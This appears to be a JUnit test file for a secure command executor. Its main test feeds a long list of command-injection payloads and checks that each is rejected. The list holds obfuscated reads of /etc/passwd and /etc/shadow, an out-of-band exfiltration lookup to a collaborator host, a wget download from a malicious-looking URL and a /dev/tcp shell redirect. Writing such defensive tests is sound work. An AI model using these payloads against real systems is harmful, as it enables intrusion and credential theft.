package ktc.secure.coding.util;


import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class SecureCommandExecutorTest {

    private final SecureCommandExecutor secureCommandExecutor = new SecureCommandExecutor();

    @Test
    public void testExecuteValidCommand() throws Exception {
        String command = "whoami";
        List<String> args = List.of();
        String result = secureCommandExecutor.executeCommand(command, args);
        assertTrue(result.length() > 0);
    }

    @Test
    public void testExecuteInvalidCommand() {
        String command = "invalid_command";
        List<String> args = List.of();
        assertThrows(IllegalArgumentException.class, () -> {
            secureCommandExecutor.executeCommand(command, args);
        });
    }

    @Test
    public void testExecuteCommandWithArguments() {
        String command = "whoami";
        List<String> args = List.of("invalid_arg$");
        assertThrows(IllegalArgumentException.class, () -> {
            secureCommandExecutor.executeCommand(command, args);
        });
    }

    @Test
    public void testExecuteCommandInjectionAttempts() {
        List<String> injectionAttempts = List.of(
            "&", "&&", "|", "||", ";", "\n", "`", "$(", ")", "<", ">", "-",
            "whoami||id", "whoami |id", "whoami&&id", "whoami&id", "whoami; id", "whoami%0A id",
            "`whoami`", "$(whoami)", "whoami; id", "whoami${LS_COLORS:10:1}${IFS}id",
            "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->", "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->",
            "<!--#exec cmd=\"/usr/bin/id;-->", "/index.html|whoami|", ";netstat -a;", ";system('cat /etc/passwd')",
            "a;id", "a|id", "`id`", "$(`whoami`)",
            "%0Acat%20/etc/passwd", "{{ get_user_file(\"/etc/passwd\") }}", "system('cat /etc/passwd')",
            "cmd || ping -n 30 127.0.0.1", "`ping 127.0.0.1`",
            "x||ping -c 10 127.0.0.1||", "||whoami>/var/www/images/output.txt||", 
            "x||nslookup burp.collaborator.address||", "||nslookup `whoami`.burp.collaborator.address||",
            "|| sleep 5", "|| whoami", "& wget http://maliciouslink.com",
            "1;sleep${IFS}9;#${IFS}'", "/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/",
            "cat</etc/passwd", "{cat,/etc/passwd}", "cat$IFS/etc/passwd",
            "echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd", "X=$'uname\\x20-a'&&$X", "sh</dev/tcp/127.0.0.1/4242",
            "IFS=,;`cat<<<uname,-a`", "ping%CommonProgramFiles:~10,-18%IP", "ping%PROGRAMFILES:~10,-5%IP",
            "echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"/etc/passwd", "cat `echo -e \"\\x2f\\x65\\x74\\x63\\x70\\x61\\x73\\x73\\x77\\x64\"`",
            "abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc", "`echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x70\\x61\\x73\\x73\\x77\\x64'`",
            "xxd -r -p <<< 2f6574632f706173737764", "cat `xxd -r -p <<< 2f6574632f706173737764`",
            "xxd -r -ps <(echo 2f6574632f706173737764)", "cat `xxd -r -ps <(echo 2f6574632f706173737764)`",
            "echo ${HOME:0:1}", "cat ${HOME:0:1}etc${HOME:0:1}passwd",
            "echo . | tr '!-0' '\"-1'/", "cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
            "w'h'o'am'i", "w\"h\"o\"am\"i", "w\\ho\\am\\i", "/\\b\\i\\n/////s\\h",
            "who$@ami", "echo $0 -> /usr/bin/zsh", "echo whoami|$0", "/???/??t /???/p??s??",
            "test=/ehhh/hmtc/pahhh/hmsswd", "cat ${test//hhh\\/hm/}", "cat ${test//hh??hm/}",
            "powershell C:\\*\\*2\\n??e*d.*?", "@^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e",
            "../", "../../", "~/", "/../", "/../../"
        );

        for (String attempt : injectionAttempts) {
            String command = "whoami";
            List<String> args = List.of(attempt);
            assertThrows(IllegalArgumentException.class, () -> {
                secureCommandExecutor.executeCommand(command, args);
            }, "Failed to throw exception for attempt: " + attempt);
        }
    }
}